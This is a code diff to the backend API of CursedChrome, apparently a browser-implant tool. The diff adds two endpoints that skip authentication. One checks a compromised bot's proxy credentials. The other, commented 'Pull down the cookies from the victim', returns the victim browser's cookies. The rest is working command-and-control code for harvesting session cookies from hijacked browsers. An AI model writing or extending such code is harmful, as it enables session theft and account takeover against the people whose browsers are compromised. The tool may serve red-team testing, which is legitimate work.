@@ -37,7 +37,7 @@ function getMethods(obj) {
     return result;
 };
 
-async function get_api_server() {
+async function get_api_server(proxy_utils) {
     const app = express();
     app.use(bodyParser.json());
 
@@ -91,7 +91,9 @@ async function get_api_server() {
     app.use(async function(req, res, next) {
         const ENDPOINTS_NOT_REQUIRING_AUTH = [
             '/health',
-            `${API_BASE_PATH}/login`
+            `${API_BASE_PATH}/login`,
+            `${API_BASE_PATH}/verify-proxy-credentials`,
+            `${API_BASE_PATH}/get-bot-browser-cookies`,
         ];
         if (ENDPOINTS_NOT_REQUIRING_AUTH.includes(req.originalUrl)) {
             next();
@@ -212,6 +214,15 @@ async function get_api_server() {
             }
         });
 
+        if(!user) {
+            res.status(200).json({
+                "success": false,
+                "error": "User not found with those credentials, please try again.",
+                "code": "INVALID_CREDENTIALS"
+            }).end();
+            return
+        }
+
         // Compare password with hash from database
         const password_matches = await bcrypt.compare(
             req.body.password,
@@ -315,6 +326,103 @@ async function get_api_server() {
             `${__dirname}/ssl/rootCA.crt`,
             'CursedChromeCA.crt'
         );
+    });
+
+    /*
+        Return if a given set of HTTP proxy credentials is valid or not.
+    */
+    const ValidateHTTPProxyCredsSchema = {
+        type: 'object',
+        properties: {
+            username: {
+                type: 'string',
+                required: true
+            },
+            password: {
+                type: 'string',
+                required: true
+            },
+        }
+    }
+    app.post(API_BASE_PATH + '/verify-proxy-credentials', validate({ body: ValidateHTTPProxyCredsSchema }), async (req, res) => {
+        const bot_data = await Bots.findOne({
+            where: {
+                proxy_username: req.body.username,
+                proxy_password: req.body.password,
+            },
+            attributes: [
+                'id',
+                'is_online',
+                'name',
+                'proxy_password',
+                'proxy_username',
+                'user_agent',
+            ]
+        });
+
+        if (!bot_data) {
+            res.status(200).json({
+                "success": false,
+                "error": "User not found with those credentials, please try again.",
+                "code": "INVALID_CREDENTIALS"
+            }).end();
+            return
+        }
+
+        res.status(200).json({
+            "success": true,
+            "result": {
+                id: bot_data.id,
+                is_online: bot_data.is_online,
+                name: bot_data.name,
+                user_agent: bot_data.user_agent
+            }
+        }).end();
+    });
+
+    /*
+        Pull down the cookies from the victim
+    */
+    const GetBotBrowserCookiesSchema = {
+        type: 'object',
+        properties: {
+            username: {
+                type: 'string',
+                required: true
+            },
+            password: {
+                type: 'string',
+                required: true
+            },
+        }
+    }
+    app.post(API_BASE_PATH + '/get-bot-browser-cookies', validate({ body: GetBotBrowserCookiesSchema }), async (req, res) => {
+        const bot_data = await Bots.findOne({
+            where: {
+                proxy_username: req.body.username,
+                proxy_password: req.body.password,
+            }
+        });
+
+        if (!bot_data) {
+            res.status(200).json({
+                "success": false,
+                "error": "User not found with those credentials, please try again.",
+                "code": "INVALID_CREDENTIALS"
+            }).end();
+            return
+        }
+
+        const browser_cookies = await proxy_utils.get_browser_cookie_array(
+            bot_data.browser_id
+        );
+
+        res.status(200).json({
+            "success": true,
+            "result": {
+                "cookies": browser_cookies
+            }
+        }).end();
     });
 
     /*
